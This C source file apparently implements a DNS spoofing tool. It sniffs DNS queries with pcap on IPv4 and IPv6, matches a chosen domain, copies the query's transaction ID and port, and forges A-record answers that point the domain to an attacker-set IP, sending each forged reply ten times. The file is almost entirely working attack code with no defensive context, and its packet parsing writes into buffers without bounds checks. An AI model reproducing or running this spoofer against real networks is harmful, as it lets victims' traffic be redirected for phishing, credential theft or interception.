#include "spoof.h"


void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct etherhdr* ether;

    /* ethernet */
    ether = (struct etherhdr*)(packet);
    if (ntohs(ether->ether_type) == ETHERTYPE_IP) {
        process_ipv4(pkthdr, packet);
    }
    if (ntohs(ether->ether_type) == ETHERTYPE_IPV6) {
        opts.ipv6_flag = TRUE;
        process_ipv6(pkthdr, packet);
        opts.ipv6_flag = FALSE;
    }
}


void process_ipv4(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct etherhdr* ether;
    struct iphdr *ip;
    struct udphdr* udp;
    struct dnshdr* dns_hdr;
    struct dnsquery* dns_query;
    struct in_addr ip_addr;

    char* answer = NULL;
    char request[URL_SIZE] = {0}, response[DEFAULT_SIZE] = {0};
    unsigned short size_payload;
    unsigned short size_res_payload;
    unsigned short size_dns_payload;

    ether = (struct etherhdr*)(packet);
    /* ip header */
    ip = (struct iphdr*)(((char*) ether) + sizeof(struct etherhdr));
    /* udp header */
    udp = (struct udphdr*)(((char*) ip) + sizeof(struct iphdr));
    /* dns header */
    dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
    /* dns query */
    dns_query = (struct dnsquery*)((char*) dns_hdr + 12);

    size_payload = ntohs(ip->tot_len) - sizeof(struct iphdr) + sizeof(struct udphdr);
    if (size_payload > 0) {
        handle_DNS_query(dns_query, request);
        if (!strcmp(request, opts.request_url)) {
            puts("[ IPv4 ]");
            /* set up opts (get necessary info) */
            opts.device_port = ntohs(udp->uh_sport);
            opts.tid = ntohs(dns_hdr->id);
            ip_addr.s_addr = ip->daddr;
            strcpy(opts.dns_ip, inet_ntoa(ip_addr));

            answer = response + sizeof(struct iphdr) + sizeof(struct udphdr);
            size_res_payload = set_payload(dns_hdr, answer, request, opts.ipv6_flag);
            size_dns_payload = size_res_payload;
            answer = response;
            size_res_payload += (sizeof(struct ip) + sizeof(struct udphdr));
            create_ipv4_header(answer, size_dns_payload, size_res_payload);
            for (int i = 0; i < 10; i++)
                send_dns_answer(answer, size_res_payload);
        }
    }
}


void process_ipv6(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct etherhdr* ether;
    struct ip6_hdr *ip;
    struct udphdr* udp;
    struct dnshdr* dns_hdr;
    struct dnsquery* dns_query;

    char* answer = NULL;
    char request[URL_SIZE] = {0};
    char response[DEFAULT_SIZE] = {0}, datagram[DEFAULT_SIZE] = {0};
    unsigned short size_payload;
    unsigned short size_res_payload;
    unsigned short size_dns_payload;

    ether = (struct etherhdr*)(packet);
    /* ip header */
    ip = (struct ip6_hdr*)(((char*) ether) + sizeof(struct etherhdr));
    /* udp header */
    udp = (struct udphdr*)(((char*) ip) + sizeof(struct ip6_hdr));
    /* dns header */
    dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
    /* dns query */
    dns_query = (struct dnsquery*)((char*) dns_hdr + 12);

    size_payload = ntohs(ip->ip6_ctlun.ip6_un1.ip6_un1_plen) - sizeof(struct udphdr);
    if (size_payload > 0) {
        handle_DNS_query(dns_query, request);
        if (!strcmp(request, opts.request_url)) {
            puts("[ IPv6 ]");
            /* set up opts (get necessary info) */
            inet_ntop(AF_INET6, &ip->ip6_src, opts.device_ipv6, INET6_ADDRSTRLEN);
            inet_ntop(AF_INET6, &ip->ip6_dst, opts.dns_ipv6, INET6_ADDRSTRLEN);
            opts.device_port = ntohs(udp->uh_sport);
            opts.tid = ntohs(dns_hdr->id);

            answer = response + sizeof(struct ip6_hdr) + sizeof(struct udphdr);
            size_res_payload = set_payload(dns_hdr, answer, request, opts.ipv6_flag);
            size_dns_payload = size_res_payload;
            answer = response;
            size_res_payload += (sizeof(struct ip6_hdr) + sizeof(struct udphdr));
            create_ipv6_header(answer, size_dns_payload, size_res_payload);
            for (int i = 0; i < 10; i++)
                send_dns_answer2(answer, size_res_payload);
        }
    }
}




/**
 * Extracts the request from a dns query
 * It comes in this format: [3]www[5]abcdefg[3]com[0]
 * And it is returned in this: www.abcdefg.com
 */
void handle_DNS_query(struct dnsquery* dns_query, char *request) {
    unsigned int i, j, k;
    uint8_t* curr = (uint8_t*)dns_query;
    unsigned int size;

    size = (unsigned int) curr[0];

    j=0;
    i=1;
    while(size > 0) {
        for(k=0; k<size; k++) {
            request[j++] = curr[i + k];
        }
        request[j++]='.';
        i+=size;
        size = curr[i++];
    }
    request[--j] = '\0';
    opts.query_name = curr;
}


uint16_t set_payload(struct dnshdr *dns_hdr, char* answer, char* request, bool flag) {
    struct dnshdr* dns = NULL;
    struct dnsquery* queries = NULL;
    struct dnsanswer* answers = NULL;
    char* token;
    int i = 0;


    dns = (struct dnshdr*) answer;
    dns->id = htons(opts.tid);
    dns->qr = 1; // This is a response
    dns->opcode = 0; // Standard response
    dns->aa = 0; // Not Authoritative (This might change based on your DNS server)
    dns->tc = 0; // Message not truncated
    dns->rd = 1; // Recursion Desired
    dns->ra = 1; // Recursion available -
    dns->z = 0; // Reserved field
    dns->ad = 0; // Authenticated data (relevant in DNSSEC)
    dns->cd = 0; // Checking disabled (relevant in DNSSEC)
    dns->rcode = 0; // Response code - should be 0 (NOERROR) for a successful response
    dns->q_count = htons(1); // only 1 question
    dns->ans_count = htons(1); // Number of answer RRs - Change this to reflect the number of answers
    dns->auth_count = 0; // Number of authority RRs - Change this if you're including any authority RRs
    dns->add_count = 0; // Number of additional RRs - Change this if you're including any additional RRs


    for (int i = 0; i < strlen((char*)opts.query_name); i++) {
        answer[12 + i] = (char) opts.query_name[i];
    }
    answer[12 + strlen((char*)opts.query_name)] = 0;
    answer += 12 + strlen((char*)opts.query_name) + 1;

    memcpy(answer, "\x00\x01", 2);  // type
//    if (flag == TRUE) memcpy(answer, "\x00\x1c", 2);
    answer += 2;

    memcpy(answer, "\x00\x01", 2);  // class
    answer += 2;

    memcpy(answer, "\xc0\x0c", 2);  // pointer to name
    answer += 2;

    memcpy(answer, "\x00\x01", 2);  // type
//    if (flag == TRUE) memcpy(answer, "\x00\x1c", 2);
    answer += 2;

    memcpy(answer, "\x00\x01", 2);  // class
    answer += 2;

    memcpy(answer, "\x00\x00\x00\x99", 4);  // ttl
    answer += 4;

    memcpy(answer, "\x00\x04", 2);   // data len
    answer += 2;

    token = strtok(opts.spoofing_ip, ".");
    while(token != NULL) {
        answer[i] = (uint8_t) atoi(token);
        token = strtok(NULL, ".");
        i++;
    }
    answer += 4;

    return 12 + strlen((char*)opts.query_name) + 1 + 20;
}
